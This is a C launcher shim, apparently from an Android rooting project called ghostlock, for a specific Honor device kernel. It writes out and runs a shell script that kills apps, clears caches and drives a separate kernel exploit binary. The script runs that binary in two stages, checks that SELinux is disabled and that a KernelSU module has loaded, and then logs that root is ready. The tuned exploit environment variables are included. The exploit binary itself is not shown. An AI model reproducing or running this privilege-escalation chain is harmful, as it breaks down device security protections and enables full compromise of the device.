/*
 * libghostlock.so shim for NTH-AN00 (5.4.289-qgki-g8f2019ef68d9).
 *
 * The upstream ghostlock-app native hardcodes a kernel image base and a fixed
 * direct-map base; on this device text KASLR and the direct-map base are both
 * randomized per boot (measured: slide 0x10c7800000 vs 0x1da7400000,
 * memstart 0xffffffc480000000 vs 0xffffffcbc0000000), so a rebuilt upstream
 * native cannot work with constants or with a profile alone.
 *
 * This launcher therefore ignores the GLK1 wire protocol and drives the
 * already-validated CLI exploit (its own memstart/KASLR probing), with the
 * proven environment. Payload lives in /data/local/tmp (CLI `e` + ksu_fne/).
 */
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static const char kScript[] =
    "#!/system/bin/sh\n"
    "cd /data/local/tmp || exit 1\n"
    "LOG=/data/local/tmp/ghostlock_app.log\n"
    "SYNC=\"GL_AIM_DM=1 GL_W1_ATTEMPTS=2 GL_ROUTE_ATTEMPTS=1 GL_HOLD_CHAIN=1 "
    "GL_HOLD_WAITER=1 GL_PUNCH_IN_WINDOW=1 GL_PUNCH_DELAY_USEC=0 GL_MCAST_ROUTE=1 "
    "GL_PROBE_BOOTID=0 GL_SPRAY_TEST=0 GL_STAMP_SYNC=1\"\n"
    "am force-stop com.hihonor.photos 2>/dev/null\n"
    "am force-stop com.hihonor.searchservice 2>/dev/null\n"
    "am kill-all 2>/dev/null\n"
    "pm trim-caches 999999999999 2>/dev/null\n"
    "sleep 60\n"
    "if [ ! -x /data/local/tmp/e ]; then echo \"GHOSTLOCK_SHIM: missing /data/local/tmp/e\" >> \"$LOG\"; exit 4; fi\n"
    ": > \"$LOG\"\n"
    "env $SYNC ./e --write1 >> \"$LOG\" 2>&1\n"
    "grep -q \"SELinux DISABLED\" \"$LOG\" || { echo \"GHOSTLOCK_SHIM: write1 failed\" >> \"$LOG\"; exit 2; }\n"
    "env $SYNC GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=0 ./e >> \"$LOG\" 2>&1\n"
    "grep -q \"KernelSU module is loaded\" \"$LOG\" || { echo \"GHOSTLOCK_SHIM: ksu not loaded\" >> \"$LOG\"; exit 3; }\n"
    "echo \"GHOSTLOCK_SHIM: root ready\" >> \"$LOG\"\n"
    "exit 0\n";

static const char kScriptPath[] = "/data/local/tmp/ghostlock_app.sh";

static void ensure_script(void) {
    if (access(kScriptPath, R_OK) == 0) return;
    int fd = open(kScriptPath, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) return;
    size_t len = strlen(kScript);
    size_t done = 0;
    while (done < len) {
        ssize_t n = write(fd, kScript + done, len - done);
        if (n <= 0) break;
        done += (size_t) n;
    }
    close(fd);
    chmod(kScriptPath, 0755);
}

int main(int argc, char **argv) {
    (void) argc;
    (void) argv;
    ensure_script();
    execl("/system/bin/sh", "sh", kScriptPath, (char *) NULL);
    return 127;
}
